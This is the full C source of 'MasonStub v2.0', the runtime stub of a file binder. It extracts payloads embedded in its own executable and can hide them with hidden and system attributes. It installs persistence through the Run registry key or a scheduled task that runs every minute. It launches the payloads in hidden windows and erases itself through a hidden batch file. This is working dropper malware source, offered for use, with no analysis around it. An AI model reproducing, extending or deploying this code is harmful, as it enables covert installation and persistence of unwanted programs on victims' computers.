/*
 *  ============================================================
 *   MasonStub v2.0 - Self-Extracting Stub Engine
 *   Copyright (c) 2026 MasonGroup. All Rights Reserved.
 *
 *   Runtime extraction component of MasonBinder.
 *   Reads embedded archive data from own executable image,
 *   extracts files to configured paths, installs startup
 *   persistence, and executes extracted files with per-file
 *   execution modes, sleep delays, and cleanup options.
 *
 *   Developed by MasonGroup Engineering Division
 *   Licensed under MasonGroup Proprietary License (MGPL)
 *  ============================================================
 */

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MASON_MAGIC              0x424E534D
#define MASON_MAX_FILEPATH       520
#define MASON_CRC_POLY           0xEDB88320UL
#define MASON_STUB_MAGIC         0x53424E4D

#define MASON_FL_COMPRESS        0x0001

#define MASON_STARTUP_NONE       0
#define MASON_STARTUP_REGISTRY   1
#define MASON_STARTUP_SCHEDULER  2

#define MASON_EXEC_RUNNING       0
#define MASON_EXEC_RUNONCE       1
#define MASON_EXEC_NORUN         2

#pragma pack(push, 1)
typedef struct {
    DWORD MasonMagic;
    DWORD MasonVersion;
    DWORD MasonFileCount;
    DWORD MasonFlags;
    DWORD MasonReserved1;
    DWORD MasonTotalOrigSize;
    DWORD MasonTotalCompSize;
    DWORD MasonCreationTimeLow;
    DWORD MasonCreationTimeHigh;
    BYTE  MasonReserved[28];
} MASON_ARCHIVE_HEADER;

typedef struct {
    char  MasonFileName[MASON_MAX_FILEPATH];
    DWORD MasonOriginalSize;
    DWORD MasonCompressedSize;
    DWORD MasonDataOffset;
    DWORD MasonChecksum;
    DWORD MasonPriority;
    DWORD MasonFileAttributes;
    DWORD MasonEntryFlags;
    DWORD MasonStartupType;
    DWORD MasonExecMode;
    DWORD MasonHiddenFlag;
    DWORD MasonDeleteFlag;
    DWORD MasonSleepMs;
    char  MasonCustomDrop[MASON_MAX_FILEPATH];
    BYTE  MasonEntryReserved[8];
} MASON_FILE_ENTRY;

typedef struct {
    DWORD MasonArchiveOffset;
    char  MasonDropPath[MASON_MAX_FILEPATH];
    DWORD MasonAutoExec;
    DWORD MasonStubFlags;
    DWORD MasonSelfDelete;
    DWORD MasonStubMagic;
} MASON_STUB_FOOTER;
#pragma pack(pop)

static DWORD MasonCrcTable[256];
static BOOL  MasonCrcTableReady = FALSE;

void MasonInitCrcTable(void)
{
    DWORD MasonCrc, MasonIdx, MasonBit;
    if (MasonCrcTableReady) return;
    for (MasonIdx = 0; MasonIdx < 256; MasonIdx++) {
        MasonCrc = MasonIdx;
        for (MasonBit = 0; MasonBit < 8; MasonBit++) {
            if (MasonCrc & 1)
                MasonCrc = (MasonCrc >> 1) ^ MASON_CRC_POLY;
            else
                MasonCrc >>= 1;
        }
        MasonCrcTable[MasonIdx] = MasonCrc;
    }
    MasonCrcTableReady = TRUE;
}

DWORD MasonCalcCrc32(const BYTE *MasonData, DWORD MasonLen)
{
    DWORD MasonCrc = 0xFFFFFFFF;
    DWORD MasonPos;
    MasonInitCrcTable();
    for (MasonPos = 0; MasonPos < MasonLen; MasonPos++)
        MasonCrc = MasonCrcTable[(MasonCrc ^ MasonData[MasonPos]) & 0xFF] ^ (MasonCrc >> 8);
    return MasonCrc ^ 0xFFFFFFFF;
}

DWORD MasonDecompressRLE(const BYTE *MasonSrc, DWORD MasonSrcLen, BYTE *MasonDst, DWORD MasonDstCap)
{
    DWORD MasonSrcPos = 0, MasonDstPos = 0;
    BYTE  MasonCtrl;
    DWORD MasonCount;

    while (MasonSrcPos < MasonSrcLen && MasonDstPos < MasonDstCap) {
        MasonCtrl = MasonSrc[MasonSrcPos++];
        if (MasonCtrl & 0x80) {
            MasonCount = MasonCtrl & 0x7F;
            if (MasonSrcPos >= MasonSrcLen) return 0;
            if (MasonDstPos + MasonCount > MasonDstCap) return 0;
            memset(MasonDst + MasonDstPos, MasonSrc[MasonSrcPos++], MasonCount);
            MasonDstPos += MasonCount;
        } else {
            MasonCount = MasonCtrl;
            if (MasonCount == 0) return 0;
            if (MasonSrcPos + MasonCount > MasonSrcLen) return 0;
            if (MasonDstPos + MasonCount > MasonDstCap) return 0;
            memcpy(MasonDst + MasonDstPos, MasonSrc + MasonSrcPos, MasonCount);
            MasonSrcPos += MasonCount;
            MasonDstPos += MasonCount;
        }
    }
    return MasonDstPos;
}

void MasonStubGetOwnPath(char *MasonPath, int MasonPathLen)
{
    GetModuleFileNameA(NULL, MasonPath, MasonPathLen);
}

void MasonStubGetOwnDir(char *MasonDir, int MasonDirLen)
{
    char *MasonSlash;
    GetModuleFileNameA(NULL, MasonDir, MasonDirLen);
    MasonSlash = strrchr(MasonDir, '\\');
    if (MasonSlash) *MasonSlash = '\0';
}

void MasonStubExtractName(const char *MasonPath, char *MasonName, int MasonLen)
{
    const char *MasonSlash, *MasonBack;
    MasonSlash = strrchr(MasonPath, '/');
    MasonBack  = strrchr(MasonPath, '\\');
    if (MasonBack && (!MasonSlash || MasonBack > MasonSlash))
        MasonSlash = MasonBack;
    if (MasonSlash)
        _snprintf(MasonName, MasonLen, "%s", MasonSlash + 1);
    else
        _snprintf(MasonName, MasonLen, "%s", MasonPath);
}

void MasonStubGetBaseName(const char *MasonFileName, char *MasonBase, int MasonBaseLen)
{
    char *MasonDot;
    _snprintf(MasonBase, MasonBaseLen - 1, "%s", MasonFileName);
    MasonBase[MasonBaseLen - 1] = '\0';
    MasonDot = strrchr(MasonBase, '.');
    if (MasonDot) *MasonDot = '\0';
}

void MasonStubInstallRegistry(const char *MasonFilePath)
{
    char MasonAppData[MASON_MAX_FILEPATH];
    char MasonDestPath[MASON_MAX_FILEPATH];
    char MasonFileName[260];
    char MasonBaseName[260];
    HKEY MasonRegKey;

    ExpandEnvironmentStringsA("%APPDATA%", MasonAppData, sizeof(MasonAppData));
    MasonStubExtractName(MasonFilePath, MasonFileName, sizeof(MasonFileName));

    _snprintf(MasonDestPath, sizeof(MasonDestPath) - 1, "%s\\%s", MasonAppData, MasonFileName);
    MasonDestPath[sizeof(MasonDestPath) - 1] = '\0';

    CopyFileA(MasonFilePath, MasonDestPath, FALSE);
    MasonStubGetBaseName(MasonFileName, MasonBaseName, sizeof(MasonBaseName));

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &MasonRegKey) == ERROR_SUCCESS) {
        RegSetValueExA(MasonRegKey, MasonBaseName, 0, REG_SZ,
                       (const BYTE *)MasonDestPath, (DWORD)strlen(MasonDestPath) + 1);
        RegCloseKey(MasonRegKey);
    }
}

void MasonStubInstallScheduler(const char *MasonFilePath)
{
    char MasonAppData[MASON_MAX_FILEPATH];
    char MasonDestPath[MASON_MAX_FILEPATH];
    char MasonFileName[260];
    char MasonBaseName[260];
    char MasonCmdLine[1280];
    STARTUPINFOA MasonSi;
    PROCESS_INFORMATION MasonPi;

    ExpandEnvironmentStringsA("%APPDATA%", MasonAppData, sizeof(MasonAppData));
    MasonStubExtractName(MasonFilePath, MasonFileName, sizeof(MasonFileName));

    _snprintf(MasonDestPath, sizeof(MasonDestPath) - 1, "%s\\%s", MasonAppData, MasonFileName);
    MasonDestPath[sizeof(MasonDestPath) - 1] = '\0';

    CopyFileA(MasonFilePath, MasonDestPath, FALSE);
    MasonStubGetBaseName(MasonFileName, MasonBaseName, sizeof(MasonBaseName));

    _snprintf(MasonCmdLine, sizeof(MasonCmdLine) - 1,
              "schtasks.exe /create /f /sc minute /mo 1 /tn \"%s\" /tr \"%s\"",
              MasonBaseName, MasonDestPath);
    MasonCmdLine[sizeof(MasonCmdLine) - 1] = '\0';

    memset(&MasonSi, 0, sizeof(MasonSi));
    MasonSi.cb = sizeof(MasonSi);
    MasonSi.dwFlags = STARTF_USESHOWWINDOW;
    MasonSi.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, MasonCmdLine, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &MasonSi, &MasonPi)) {
        WaitForSingleObject(MasonPi.hProcess, 15000);
        CloseHandle(MasonPi.hProcess);
        CloseHandle(MasonPi.hThread);
    }
}

BOOL MasonStubCheckRunonce(const char *MasonFileName)
{
    char MasonRegPath[512];
    char MasonKeyName[260];
    HKEY MasonKey;
    DWORD MasonVal, MasonSize, MasonType;

    MasonStubGetBaseName((char *)MasonFileName, MasonKeyName, sizeof(MasonKeyName));
    _snprintf(MasonRegPath, sizeof(MasonRegPath) - 1, "Software\\MasonGroup\\Runonce");
    MasonRegPath[sizeof(MasonRegPath) - 1] = '\0';

    if (RegOpenKeyExA(HKEY_CURRENT_USER, MasonRegPath, 0, KEY_READ, &MasonKey) == ERROR_SUCCESS) {
        MasonSize = sizeof(MasonVal);
        if (RegQueryValueExA(MasonKey, MasonKeyName, NULL, &MasonType, (BYTE *)&MasonVal, &MasonSize) == ERROR_SUCCESS) {
            RegCloseKey(MasonKey);
            return TRUE;
        }
        RegCloseKey(MasonKey);
    }
    return FALSE;
}

void MasonStubMarkRunonce(const char *MasonFileName)
{
    char MasonRegPath[512];
    char MasonKeyName[260];
    HKEY MasonKey;
    DWORD MasonVal = 1;

    MasonStubGetBaseName((char *)MasonFileName, MasonKeyName, sizeof(MasonKeyName));
    _snprintf(MasonRegPath, sizeof(MasonRegPath) - 1, "Software\\MasonGroup\\Runonce");
    MasonRegPath[sizeof(MasonRegPath) - 1] = '\0';

    if (RegCreateKeyExA(HKEY_CURRENT_USER, MasonRegPath, 0, NULL, 0,
                        KEY_WRITE, NULL, &MasonKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(MasonKey, MasonKeyName, 0, REG_DWORD, (BYTE *)&MasonVal, sizeof(MasonVal));
        RegCloseKey(MasonKey);
    }
}

void MasonStubExecFile(const char *MasonFilePath, const char *MasonWorkDir, BOOL MasonHidden)
{
    SHELLEXECUTEINFOA MasonSei;

    memset(&MasonSei, 0, sizeof(MasonSei));
    MasonSei.cbSize = sizeof(MasonSei);
    MasonSei.fMask = SEE_MASK_NOCLOSEPROCESS;
    MasonSei.lpFile = MasonFilePath;
    MasonSei.lpDirectory = MasonWorkDir;
    MasonSei.nShow = MasonHidden ? SW_HIDE : SW_SHOWNORMAL;

    ShellExecuteExA(&MasonSei);
    if (MasonSei.hProcess) CloseHandle(MasonSei.hProcess);
}

int WINAPI WinMain(HINSTANCE MasonInst, HINSTANCE MasonPrev,
                   LPSTR MasonCmdLine, int MasonShow)
{
    char MasonSelfPath[MASON_MAX_FILEPATH];
    char MasonOwnDir[MASON_MAX_FILEPATH];
    char MasonGlobalDrop[MASON_MAX_FILEPATH * 2];
    char MasonFileDrop[MASON_MAX_FILEPATH * 2];
    char MasonOutPath[MASON_MAX_FILEPATH * 2];
    HANDLE MasonSelf;
    DWORD MasonSelfSize, MasonRead;
    MASON_STUB_FOOTER MasonFooter;
    MASON_ARCHIVE_HEADER MasonHdr;
    MASON_FILE_ENTRY *MasonEntries;
    DWORD MasonI;
    DWORD MasonBaseOffset;
    BOOL MasonGlobalHidden;

    (void)MasonInst;
    (void)MasonPrev;
    (void)MasonCmdLine;
    (void)MasonShow;

    MasonStubGetOwnPath(MasonSelfPath, sizeof(MasonSelfPath));
    MasonStubGetOwnDir(MasonOwnDir, sizeof(MasonOwnDir));

    MasonSelf = CreateFileA(MasonSelfPath, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (MasonSelf == INVALID_HANDLE_VALUE) return 1;

    MasonSelfSize = GetFileSize(MasonSelf, NULL);
    if (MasonSelfSize < sizeof(MASON_STUB_FOOTER) + sizeof(MASON_ARCHIVE_HEADER)) {
        CloseHandle(MasonSelf);
        return 1;
    }

    SetFilePointer(MasonSelf, (LONG)(MasonSelfSize - sizeof(MASON_STUB_FOOTER)), NULL, FILE_BEGIN);
    ReadFile(MasonSelf, &MasonFooter, sizeof(MASON_STUB_FOOTER), &MasonRead, NULL);

    if (MasonFooter.MasonStubMagic != MASON_STUB_MAGIC) {
        CloseHandle(MasonSelf);
        return 1;
    }

    MasonBaseOffset = MasonFooter.MasonArchiveOffset;
    MasonGlobalHidden = (MasonFooter.MasonStubFlags & 0x0001) ? TRUE : FALSE;

    if (MasonFooter.MasonDropPath[0] == '\0' ||
        (MasonFooter.MasonDropPath[0] == '.' && MasonFooter.MasonDropPath[1] == '\0')) {
        _snprintf(MasonGlobalDrop, sizeof(MasonGlobalDrop) - 1, "%s", MasonOwnDir);
    } else if (_strnicmp(MasonFooter.MasonDropPath, "%CURRENT%", 9) == 0) {
        if (MasonFooter.MasonDropPath[9] == '\\')
            _snprintf(MasonGlobalDrop, sizeof(MasonGlobalDrop) - 1, "%s%s", MasonOwnDir, MasonFooter.MasonDropPath + 9);
        else
            _snprintf(MasonGlobalDrop, sizeof(MasonGlobalDrop) - 1, "%s", MasonOwnDir);
    } else {
        ExpandEnvironmentStringsA(MasonFooter.MasonDropPath, MasonGlobalDrop, sizeof(MasonGlobalDrop));
    }
    MasonGlobalDrop[sizeof(MasonGlobalDrop) - 1] = '\0';

    SHCreateDirectoryExA(NULL, MasonGlobalDrop, NULL);

    SetFilePointer(MasonSelf, MasonBaseOffset, NULL, FILE_BEGIN);
    ReadFile(MasonSelf, &MasonHdr, sizeof(MASON_ARCHIVE_HEADER), &MasonRead, NULL);

    if (MasonHdr.MasonMagic != MASON_MAGIC) {
        CloseHandle(MasonSelf);
        return 1;
    }

    MasonEntries = (MASON_FILE_ENTRY *)calloc(MasonHdr.MasonFileCount, sizeof(MASON_FILE_ENTRY));
    if (!MasonEntries) {
        CloseHandle(MasonSelf);
        return 1;
    }

    ReadFile(MasonSelf, MasonEntries, MasonHdr.MasonFileCount * sizeof(MASON_FILE_ENTRY),
             &MasonRead, NULL);

    for (MasonI = 0; MasonI < MasonHdr.MasonFileCount; MasonI++) {
        BYTE  *MasonReadBuf;
        BYTE  *MasonFinalData;
        DWORD  MasonFinalSize;
        HANDLE MasonOutFile;
        DWORD  MasonWrt;

        if (MasonEntries[MasonI].MasonCustomDrop[0] != '\0') {
            if (_strnicmp(MasonEntries[MasonI].MasonCustomDrop, "%CURRENT%", 9) == 0) {
                if (MasonEntries[MasonI].MasonCustomDrop[9] == '\\')
                    _snprintf(MasonFileDrop, sizeof(MasonFileDrop) - 1, "%s%s", MasonOwnDir, MasonEntries[MasonI].MasonCustomDrop + 9);
                else
                    _snprintf(MasonFileDrop, sizeof(MasonFileDrop) - 1, "%s", MasonOwnDir);
            } else {
                ExpandEnvironmentStringsA(MasonEntries[MasonI].MasonCustomDrop,
                                         MasonFileDrop, sizeof(MasonFileDrop));
            }
            MasonFileDrop[sizeof(MasonFileDrop) - 1] = '\0';
            SHCreateDirectoryExA(NULL, MasonFileDrop, NULL);
        } else {
            _snprintf(MasonFileDrop, sizeof(MasonFileDrop) - 1, "%s", MasonGlobalDrop);
            MasonFileDrop[sizeof(MasonFileDrop) - 1] = '\0';
        }

        SetFilePointer(MasonSelf, MasonBaseOffset + MasonEntries[MasonI].MasonDataOffset,
                       NULL, FILE_BEGIN);

        MasonReadBuf = (BYTE *)malloc(MasonEntries[MasonI].MasonCompressedSize + 1);
        if (!MasonReadBuf) continue;

        ReadFile(MasonSelf, MasonReadBuf, MasonEntries[MasonI].MasonCompressedSize,
                 &MasonRead, NULL);

        MasonFinalData = MasonReadBuf;
        MasonFinalSize = MasonEntries[MasonI].MasonCompressedSize;

        if (MasonEntries[MasonI].MasonEntryFlags & MASON_FL_COMPRESS) {
            BYTE *MasonDecompBuf = (BYTE *)malloc(MasonEntries[MasonI].MasonOriginalSize + 1);
            if (!MasonDecompBuf) {
                free(MasonReadBuf);
                continue;
            }
            {
                DWORD MasonDecompLen = MasonDecompressRLE(
                    MasonFinalData, MasonFinalSize,
                    MasonDecompBuf, MasonEntries[MasonI].MasonOriginalSize + 1);

                if (MasonDecompLen == MasonEntries[MasonI].MasonOriginalSize) {
                    MasonFinalData = MasonDecompBuf;
                    MasonFinalSize = MasonDecompLen;
                } else {
                    free(MasonDecompBuf);
                    free(MasonReadBuf);
                    continue;
                }
            }
        }

        if (MasonEntries[MasonI].MasonChecksum != 0) {
            DWORD MasonVerifyCrc = MasonCalcCrc32(MasonFinalData, MasonFinalSize);
            if (MasonVerifyCrc != MasonEntries[MasonI].MasonChecksum) {
                if (MasonFinalData != MasonReadBuf) free(MasonFinalData);
                free(MasonReadBuf);
                continue;
            }
        }

        _snprintf(MasonOutPath, sizeof(MasonOutPath) - 1, "%s\\%s",
                  MasonFileDrop, MasonEntries[MasonI].MasonFileName);
        MasonOutPath[sizeof(MasonOutPath) - 1] = '\0';

        if (MasonEntries[MasonI].MasonHiddenFlag || MasonGlobalHidden) {
            SetFileAttributesA(MasonOutPath, FILE_ATTRIBUTE_NORMAL);
        }

        MasonOutFile = CreateFileA(MasonOutPath, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (MasonOutFile != INVALID_HANDLE_VALUE) {
            WriteFile(MasonOutFile, MasonFinalData, MasonFinalSize, &MasonWrt, NULL);
            FlushFileBuffers(MasonOutFile);
            CloseHandle(MasonOutFile);

            if (MasonEntries[MasonI].MasonHiddenFlag || MasonGlobalHidden) {
                SetFileAttributesA(MasonOutPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            }
        }

        if (MasonEntries[MasonI].MasonStartupType == MASON_STARTUP_REGISTRY) {
            MasonStubInstallRegistry(MasonOutPath);
        } else if (MasonEntries[MasonI].MasonStartupType == MASON_STARTUP_SCHEDULER) {
            MasonStubInstallScheduler(MasonOutPath);
        }

        if (MasonFinalData != MasonReadBuf) free(MasonFinalData);
        free(MasonReadBuf);
    }

    for (MasonI = 0; MasonI < MasonHdr.MasonFileCount; MasonI++) {
        BOOL MasonShouldExec = FALSE;
        BOOL MasonIsHidden;

        if (MasonEntries[MasonI].MasonExecMode == MASON_EXEC_NORUN) continue;

        if (MasonEntries[MasonI].MasonExecMode == MASON_EXEC_RUNONCE) {
            if (MasonStubCheckRunonce(MasonEntries[MasonI].MasonFileName)) continue;
            MasonStubMarkRunonce(MasonEntries[MasonI].MasonFileName);
        }

        MasonShouldExec = TRUE;
        MasonIsHidden = (MasonEntries[MasonI].MasonHiddenFlag || MasonGlobalHidden) ? TRUE : FALSE;

        if (MasonEntries[MasonI].MasonCustomDrop[0] != '\0') {
            if (_strnicmp(MasonEntries[MasonI].MasonCustomDrop, "%CURRENT%", 9) == 0) {
                if (MasonEntries[MasonI].MasonCustomDrop[9] == '\\')
                    _snprintf(MasonFileDrop, sizeof(MasonFileDrop) - 1, "%s%s", MasonOwnDir, MasonEntries[MasonI].MasonCustomDrop + 9);
                else
                    _snprintf(MasonFileDrop, sizeof(MasonFileDrop) - 1, "%s", MasonOwnDir);
            } else {
                ExpandEnvironmentStringsA(MasonEntries[MasonI].MasonCustomDrop,
                                         MasonFileDrop, sizeof(MasonFileDrop));
            }
            MasonFileDrop[sizeof(MasonFileDrop) - 1] = '\0';
        } else {
            _snprintf(MasonFileDrop, sizeof(MasonFileDrop) - 1, "%s", MasonGlobalDrop);
            MasonFileDrop[sizeof(MasonFileDrop) - 1] = '\0';
        }

        _snprintf(MasonOutPath, sizeof(MasonOutPath) - 1, "%s\\%s",
                  MasonFileDrop, MasonEntries[MasonI].MasonFileName);
        MasonOutPath[sizeof(MasonOutPath) - 1] = '\0';

        if (MasonEntries[MasonI].MasonSleepMs > 0) {
            Sleep(MasonEntries[MasonI].MasonSleepMs);
        }

        if (MasonShouldExec) {
            MasonStubExecFile(MasonOutPath, MasonFileDrop, MasonIsHidden);
            Sleep(200);
        }

    }

    free(MasonEntries);
    CloseHandle(MasonSelf);

    if (MasonFooter.MasonSelfDelete) {
        char MasonTempDir[MASON_MAX_FILEPATH];
        char MasonBatPath[MASON_MAX_FILEPATH];
        char MasonBatContent[2048];
        char MasonBatCmd[MASON_MAX_FILEPATH + 32];
        HANDLE MasonBatFile;
        DWORD MasonBatWritten;
        STARTUPINFOA MasonBatSi;
        PROCESS_INFORMATION MasonBatPi;

        ExpandEnvironmentStringsA("%TEMP%", MasonTempDir, sizeof(MasonTempDir));
        _snprintf(MasonBatPath, sizeof(MasonBatPath) - 1, "%s\\~mason_%lu.bat",
                  MasonTempDir, GetCurrentProcessId());
        MasonBatPath[sizeof(MasonBatPath) - 1] = '\0';

        _snprintf(MasonBatContent, sizeof(MasonBatContent) - 1,
            "@echo off\r\n"
            ":MasonWait\r\n"
            "ping 127.0.0.1 -n 3 >nul\r\n"
            "del /f /q \"%s\"\r\n"
            "if exist \"%s\" goto MasonWait\r\n"
            "(goto) 2>nul & del /f /q \"%%~f0\"\r\n",
            MasonSelfPath, MasonSelfPath);
        MasonBatContent[sizeof(MasonBatContent) - 1] = '\0';

        MasonBatFile = CreateFileA(MasonBatPath, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (MasonBatFile != INVALID_HANDLE_VALUE) {
            WriteFile(MasonBatFile, MasonBatContent, (DWORD)strlen(MasonBatContent), &MasonBatWritten, NULL);
            CloseHandle(MasonBatFile);

            _snprintf(MasonBatCmd, sizeof(MasonBatCmd) - 1, "cmd.exe /c \"%s\"", MasonBatPath);
            MasonBatCmd[sizeof(MasonBatCmd) - 1] = '\0';

            memset(&MasonBatSi, 0, sizeof(MasonBatSi));
            MasonBatSi.cb = sizeof(MasonBatSi);
            MasonBatSi.dwFlags = STARTF_USESHOWWINDOW;
            MasonBatSi.wShowWindow = SW_HIDE;

            if (CreateProcessA(NULL, MasonBatCmd, NULL, NULL, FALSE,
                               CREATE_NO_WINDOW, NULL, NULL, &MasonBatSi, &MasonBatPi)) {
                CloseHandle(MasonBatPi.hProcess);
                CloseHandle(MasonBatPi.hThread);
            }
        }
    }

    return 0;
}

/*
 *  ============================================================
 *   End of MasonStub.c
 *   (c) 2026 MasonGroup - All Rights Reserved
 *   MasonGroup Engineering Division
 *  ============================================================
 */
